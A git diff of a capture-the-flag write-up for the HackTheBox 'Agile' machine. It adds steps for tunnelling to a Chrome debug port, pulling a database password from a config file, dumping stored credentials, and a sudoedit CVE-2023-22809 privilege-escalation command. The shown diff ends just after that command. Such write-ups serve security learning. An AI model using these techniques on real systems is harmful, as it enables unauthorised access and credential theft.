@@ -1,11 +1,25 @@
+---
+description: This is a medium box by 0xdf.
+layout:
+  title:
+    visible: true
+  description:
+    visible: true
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
+---
+
 # Agile
 
-| Name            | ![](../../../.gitbook/assets/agile.png) |
-| --------------- | --------------------------------------: |
-| OS              |                                   Linux |
-| Difficulty      |                                  Medium |
-| Vulnerabilities |                  LFI, Misconfiguration  |
-| Languages       |                                  Python |
+Information
+
+<table data-header-hidden><thead><tr><th width="374"></th><th align="right"></th></tr></thead><tbody><tr><td>Name</td><td align="right"><img src="../../../.gitbook/assets/agile.png" alt=""></td></tr><tr><td>OS</td><td align="right">Linux</td></tr><tr><td>Difficulty</td><td align="right">Medium</td></tr><tr><td>Vulnerabilities</td><td align="right">LFI, Misconfiguration </td></tr><tr><td>Languages</td><td align="right">Python</td></tr></tbody></table>
+
+<img src="../../../.gitbook/assets/file.excalidraw.svg" alt="Solution flow graph" class="gitbook-drawing">
 
 ## Enumeration
 
@@ -46,7 +60,7 @@ The scan reveals ports 22 (SSH) and 80 (Nginx) open.&#x20;
 
 ### Subdomain Brute Force
 
-I will try to brute force the DNS server named "superpass.htb" with ffuf to check if there are any different subdomains. However, it doesn't return any results.
+I will try to brute force the DNS server named "superpass.htb" with `ffuf` to check if there are any different subdomains. However, it doesn't return any results.
 
 So let's add this vHost to /etc/hosts file.
 
@@ -90,7 +104,7 @@ When I try random file path, the page crashes revealing that the server is runni
 
 <figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
-In the debug mode, it has a Python console that can execute extra commands. When I click on the little terminal logo, a message pops up requesting the PIN
+I can open the debugger by clicking on the terminal icon in the Python code traceback. Running Python code lets I use a reverse shell. However, Werkzeug secures these interpreters with a PIN.
 
 <figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
@@ -275,7 +289,7 @@ user.txt
 
 ## Shell as edwards
 
-There is a separate testing version of the website located at `/app`:
+Within the `app` directory contains an interesting file: `config_test.json`. This file is not readable by `corum` though. There's a directory for production using `config_prod.json`, and there is also a directory for testing, so let's explore that.
 
 ```apacheconf
 corum@agile:/app$ ls -l
@@ -386,6 +400,15 @@ server {
 }
 ```
 
+Port 5555 is open.
+
+```apacheconf
+corum@agile:$ netstat -tnlp | grep 5555
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      -  
+```
+
 I can connect to it by directly creating a tunnel to TCP port 5555 on Agile.
 
 ```apacheconf
@@ -394,7 +417,7 @@ msplmee@kali:~$ ssh -L 5555:127.0.0.1:5555 corum@superpass.htb
 
 I go to `localhost:5555` and see the same page, but it doesn't have any vulnerability for LFI and is not in debug mode.
 
-Check remote debug port
+Check remote debug port.
 
 ```apacheconf
 corum@agile:/$ netstat -tnlp | grep 41829
@@ -409,19 +432,73 @@ I use SSH to tunnel 41829 on my host to 41829 on Agile.
 msplmee@kali:~$ ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
 ```
 
+### Method 1
+
 Add port 41829 to `chrome://inspect`.
 
 <figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
-Clicking on "inspect". I get `remember_token`
+Clicking on "inspect". The credentials for edwards can be grabbed from here.
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
-I add these cookies to my browser in port 5555 to get access to a new vault.
+### Method 2
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+I read read file `config_test.json` with `file` protocol
 
-I log in as the `edwards` via  SSH.
+<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+
+I go to `devtoolsFrontendUrl`
+
+<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```json
+{"SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"}
+```
+{% endcode %}
+
+I use that to connect to the database and get edwards's passwords.
+
+```apacheconf
+corum@agile:/$ mysql -u superpasstester -p
+Enter password: 
+......
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| performance_schema |
+| superpasstest      |
++--------------------+
+3 rows in set (0.00 sec)
+
+mysql> use superpasstest;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-------------------------+
+| Tables_in_superpasstest |
++-------------------------+
+| passwords               |
+| users                   |
++-------------------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from passwords;
++----+---------------------+---------------------+---------+------------+----------------------+---------+
+| id | created_date        | last_updated_data   | url     | username   | password             | user_id |
++----+---------------------+---------------------+---------+------------+----------------------+---------+
+|  1 | 2023-01-25 01:10:54 | 2023-01-25 01:10:54 | agile   | edwards    | d07867c6267dcb5df0af |       1 |
+|  2 | 2023-01-25 01:14:17 | 2023-01-25 01:14:17 | twitter | dedwards__ | 7dbfe676b6b564ce5718 |       1 |
++----+---------------------+---------------------+---------+------------+----------------------+---------+
+2 rows in set (0.00 sec)
+```
+
+I log in as the `edwards` via SSH.
 
 {% code overflow="wrap" %}
 ```apacheconf
@@ -436,7 +513,7 @@ uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)
 
 ## Shell as root
 
-I can run `sudoedit` as dev\_admin
+I can run `sudoedit` for or the "config\_test.json" file and "creds.txt" file as dev\_admin.
 
 ```apacheconf
 edwards@agile:/$ sudo -l
@@ -451,7 +528,7 @@ User edwards may run the following commands on agile:
     (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
 ```
 
-The sudo version is older than `1.9.12p2`, so sudoedit is vulnerable to `CVE-2023-22809`. To exploit this vulnerability, I require a file that the `dev_admin` can create and root can execute.
+The sudo version is older than `1.9.12p2`, so sudoedit is vulnerable to `CVE-2023-22809`. To exploit this vulnerability, I require a file that the `dev_admin` can create, and root can execute.
 
 ```apacheconf
 edwards@agile:/$ sudo -V
@@ -462,7 +539,7 @@ Sudoers I/O plugin version 1.9.9
 Sudoers audit plugin version 1.9.9
 ```
 
-The file `/app/venv/bin/activate` is writable by root and dev\_admin
+I ran `pspy64` to check any processes that are run by root and found that the `/app/venv/bin/activate` was run by root and owned by the dev\_admin group.
 
 ```
 edwards@agile:/$ ls -l /app/venv/bin/activate
@@ -470,6 +547,12 @@ edwards@agile:/$ ls -l /app/venv/bin/activate
 ```
 
 Exploit `CVE-2023-22809`
+
+{% code overflow="wrap" %}
+```apacheconf
+edwards@agile:/$ EDITOR="vim -- /app/venv/bin/activate" sudo -u dev_admin sudoedit /app/config_test.json
+```
+{% endcode %}
 
 ```bash
 # This file must be used with "source bin/activate" *from bash*
